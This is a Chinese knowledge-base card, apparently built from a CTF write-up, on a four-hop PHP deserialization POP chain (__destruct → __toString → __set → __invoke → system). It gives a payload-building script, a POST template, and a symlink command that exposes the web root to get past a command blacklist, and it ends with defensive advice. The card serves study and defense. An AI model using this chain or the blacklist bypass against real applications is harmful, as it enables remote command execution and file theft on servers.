---
id: web-php-deserialization-destruct-tostring-set-invoke-pop-system
title: PHP 反序列化四跳 POP 链：__destruct echo 触发 __toString、__toString 写未定义属性触发 __set、__set 调用变量函数触发 __invoke 到 system
type: scenario
domain: web
path: web/php/deserialization
technique: php-pop-chain-destruct-tostring-set-invoke-system
tags:
- php
- deserialization
- pop-chain
- magic-method
- rce
- waf-bypass
- symlink
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:20:44+08:00'
  notes: 已对照原文核对；本次核对未读取图片；四跳链 __destruct(echo msg)->__toString(func1/写未声明属性 str1)->__set($b())->__invoke(system) 与源码逐行一致，PoC 对象图与原文构造脚本一致；未验证点：原文同一篇内 __wakeup 一处写 guest、一处写 admin，payload 能否过 check() 需按题面实际版本确认，卡片已在利用步骤第 5 步标注该矛盾
url: /docs/web/php/deserialization/web-php-deserialization-destruct-tostring-set-invoke-pop-system/
draft: false
kb_aliases:
- __destruct __toString __set __invoke POP 链
- echo $this->msg 触发 __toString
- __set 中 $b() 变量函数调用
- __invoke 里 system 拼接命令
- 魔术方法首尾相接
---

## 一句话结论

当反序列化入口只给你一个对象、而类里同时存在 `__destruct`（`echo $this->msg`）、`__toString`（`$this->cls->func1()` 与 `$this->cls->str1 = $this->str3`）、`__set`（`$b()`）、`__invoke`（`system($this->payload)`）四个魔术方法时，把它们首尾相接即可把「反序列化」变成完整 RCE：`__destruct` 里的 `echo` 把 `msg` 当字符串用 → 触发 `class01::__toString` → 给不存在的属性 `str1` 赋值 → 触发 `class00::__set` → `__set` 把传入的值当函数调用 → 该值是 `class02` 对象 → 触发 `class02::__invoke` → `system()` 执行命令。

## 原理

PHP 魔术方法都是「由语言在特定操作发生时自动调用」，因此链条不需要业务代码主动串联，只需要让**上一步的副作用正好是下一步的触发条件**：

1. `__destruct()` 在对象销毁时自动执行，里面写了 `echo $this->msg;`。`echo` 需要字符串，若 `msg` 是对象，PHP 会在把对象转字符串时调用该对象的 `__toString()`。
2. `class01::__toString()` 内先执行 `$this->temp = $this->cls->func1();`，再判断 `$this->temp === 1`；成立时执行 `$this->cls->str1 = $this->str3;`。给一个**类中未声明**的属性 `str1` 赋值会触发 `__set($a, $b)`——这是 `__set` 的定义（写入不可访问/不存在的属性时调用）。
3. `class00::__set($a, $b)` 里只有一行 `$b();`，即把第二个参数当**变量函数**调用。若 `$b` 是一个对象且该对象定义了 `__invoke()`，PHP 在「把对象当函数调用」时会自动执行 `__invoke()`。
4. `class02::__invoke()` 里是 `system($this->payload);`，`payload` 由攻击者控制，于是落成命令执行。
5. 入口处的 `check()` 门槛（`$this->token === "admin"`）靠把 `token` 属性写成 `admin` 通过；入口本身是 `unserialize(base64_decode($_POST['user']))`，序列化串完全由攻击者构造，属性值/属性个数都可自由指定。

链之所以成立，本质是**对象属性的「类型」由攻击者决定**：同一个 `$this->msg` 在业务里是字符串，在 payload 里是对象；同一个 `$this->cls` 在业务里是普通服务类，在 payload 里是 `class00` 实例。只要魔术方法里有「对属性做转换/赋值/调用」的动作，就存在可跳转的边。

## 触发条件

- 存在 `unserialize()`（或 `phar://`、session 反序列化）且输入可控；本类场景是 POST 参数经 `base64_decode` 后直接反序列化。
- 反序列化路径上能触达含「转换/赋值/调用」动作的魔术方法（`__destruct`、`__wakeup`、`__toString`、`__set`、`__call`、`__invoke`、`__get`）。
- 属性与类的可见性允许外部赋值（`public` 或 `__construct` 可绕过）；有 `__wakeup` 之类的复位逻辑时需要额外处理（见下）。
- 最终 sink 是 `system`/`exec`/`eval`/`include` 等，且命令关键字过滤可绕过。

## 利用步骤

1. 读源码，列出所有魔术方法，标记每个方法里「对属性做了什么」：`echo`/字符串拼接 → `__toString`；写未定义属性 → `__set`；调用未定义方法 → `__call`；把属性当函数调用 → `__invoke`。
2. 从 sink 反向找边：`system($this->payload)` 在 `__invoke` 里 → 需要有人「把该对象当函数调用」→ `__set` 的 `$b()` 提供这条边 → 需要有人「给不存在的属性赋值」→ `__toString` 的 `$this->cls->str1 = ...` 提供 → 需要有人「把该对象当字符串」→ `__destruct` 的 `echo $this->msg` 提供。
3. 按边赋值构造对象图：`User->msg = class01`；`class01->cls = class00`；`class01->str3 = class02`；`class02->payload = 命令`。
4. 本地写构造脚本 `echo base64_encode(serialize($a))`，避免手写序列化串时属性长度算错。
5. 若入口有 `check()`/签名/复位（如 `__wakeup` 把 `token` 重置），确认哪一个真的会生效：`__wakeup` 在 `unserialize` 时必然执行且会覆盖同名属性；原文源码里 `__wakeup` 置 `guest`、而最终 payload 直接把 `token` 写成 `admin`，二者矛盾（正文另处引用的版本是置 `admin`），说明该题面实际以置 `admin` 的版本为准；遇到真会复位的写法时改用「属性数量超过声明数量触发 `__wakeup` 跳过」（PHP < 7.4.31 等旧版本）或寻找不带复位的同类链。
6. 命令被关键字黑名单（`cat`/`ls`/`nl`/`flag`/`|`/`*`/`$` 等一大串）拦时，用软链接把根目录挂到 Web 目录下，再用不被拦的读取方式/路径访问目标文件；本类题常见的落地是 `ln -s / /var/www/html/aaa` 后按目录结构直接取文件。

## PoC

构造脚本（原文给出的最小形式，仅本地生成 payload）：

```php
<?php
$a = new User(1, 1);
$a->token = 'admin';      // 过 __destruct 里的 check()
$a->msg   = new class01(); // echo $this->msg → __toString
$a->msg->cls  = new class00(); // 写未定义属性 str1 → __set
$a->msg->str3 = new class02(); // 被 __set 当函数调用 → __invoke
$a->msg->str3->payload = '命令';
echo base64_encode(serialize($a));
```

提交：

```text
POST /index.php
Content-Type: application/x-www-form-urlencoded

user=<base64(serialize($a))>
```

命令黑名单用软链接绕过的落地片段：

```bash
ln -s / /var/www/html/aaa
```

## 变体与关联

- 边的方向可以任意重排：`__destruct` 里 `include`/`file_get_contents` 直接给文件读；`__toString` 里 `preg_replace`/`call_user_func` 给别的 sink；`__call` 里 `return 1` 这类写法会截断链（原文的 `class00::__call` 返回 1 就是干扰项，说明 __call 分支不可用，必须走 __set）。
- 同一套路在真实框架里表现为已知 POP 链（Monolog/Laravel/Guzzle 等），差别只在魔术方法名与 sink。
- 入口变体：可控 `phar://`（文件操作触发 phar 反序列化）、session 反序列化、`unserialize` 前只做 `base64_decode`。
- 关联：[[web-php-deserialization-call-tostring-set-get-variable-variable-file-read]]（同类「魔术方法首尾相接」，但走 `__call`/`__get` 到文件读）、[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（`__wakeup` 复位与绕过）。

## 检测与防御

- 不要对用户输入调用 `unserialize`；改用 `json_decode` 并显式做字段白名单。
- 必须反序列化时用 `allowed_classes` 限制可实例化类，或对序列化串做 HMAC 签名。
- 审计侧：重点看「`echo`/字符串拼接 + 魔术方法 + 属性赋值 + 变量函数调用」四件套是否同时出现在同一个可反序列化类图里。
- 检测：POST 中出现 base64 编码的 `O:`/`a:` 结构；请求后进程产生 `system` 派生的 shell；Web 目录出现异常软链接（`ln -s /`）。
